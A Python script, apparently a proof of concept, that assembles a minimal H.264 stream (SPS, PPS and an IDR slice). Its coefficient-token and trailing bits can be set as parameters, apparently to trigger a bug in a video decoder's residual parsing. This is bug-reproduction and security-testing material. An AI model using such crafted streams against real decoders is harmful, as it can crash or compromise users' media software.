# Regenerate PoC with proper IDR dec_ref_pic_marking bits in slice header.
class BitWriter:
    def __init__(self): self.bits=[]
    def bit(self,b): self.bits.append(1 if b else 0)
    def bits_val(self,val,n):
        for i in range(n-1,-1,-1): self.bit((val>>i)&1)
    def ue(self,v):
        code_num=v+1; n=code_num.bit_length()-1
        self.bits += [0]*n
        self.bits_val(code_num,n+1)
    def se(self,v):
        self.ue(2*v-1 if v>0 else -2*v)
    def rbsp_trailing(self):
        self.bit(1)
        while len(self.bits)%8: self.bit(0)
    def bytes(self):
        out=bytearray()
        for i in range(0,len(self.bits),8):
            b=0
            for bit in self.bits[i:i+8]: b=(b<<1)|bit
            out.append(b)
        return bytes(out)

def ebsp(rbsp):
    out=bytearray(); z=0
    for b in rbsp:
        if z>=2 and b<=3:
            out.append(3); z=0
        out.append(b)
        if b==0: z+=1
        else: z=0
    return bytes(out)

def nal(nal_type, rbsp, nal_ref_idc=3):
    return b"\x00\x00\x01" + bytes([(nal_ref_idc<<5)|nal_type]) + ebsp(rbsp)

def build_poc(trailing_sign=0, coeff_token_bits=(0b01,2), zeros_bit=1):
    bw=BitWriter()
    bw.bits_val(66,8); bw.bit(1); bw.bit(0); bw.bit(0); bw.bit(0); bw.bit(0); bw.bit(0); bw.bits_val(0,2); bw.bits_val(10,8)
    bw.ue(0); bw.ue(0); bw.ue(0); bw.ue(0); bw.ue(1); bw.bit(0); bw.ue(0); bw.ue(0); bw.bit(1); bw.bit(1); bw.bit(0); bw.bit(0); bw.rbsp_trailing()
    sps=nal(7,bw.bytes())
    bw=BitWriter(); bw.ue(0); bw.ue(0); bw.bit(0); bw.bit(0); bw.ue(0); bw.ue(0); bw.ue(0); bw.bit(0); bw.bits_val(0,2); bw.se(0); bw.se(0); bw.se(0); bw.bit(0); bw.bit(0); bw.bit(0); bw.rbsp_trailing()
    pps=nal(8,bw.bytes())
    bw=BitWriter(); bw.ue(0); bw.ue(2); bw.ue(0); bw.bits_val(0,4); bw.ue(0); bw.bits_val(0,4)
    bw.bit(0); bw.bit(0)   # IDR ref pic marking flags
    bw.se(0)               # slice_qp_delta
    bw.ue(1)               # mb_type I16x16 pred=2 cbp=0
    bw.ue(0)               # intra_chroma_pred_mode
    bw.se(0)               # mb_qp_delta
    val,n=coeff_token_bits; bw.bits_val(val,n); bw.bit(trailing_sign); bw.bit(zeros_bit)
    bw.rbsp_trailing(); sl=nal(5,bw.bytes())
    return sps+pps+sl, (sps,pps,sl)

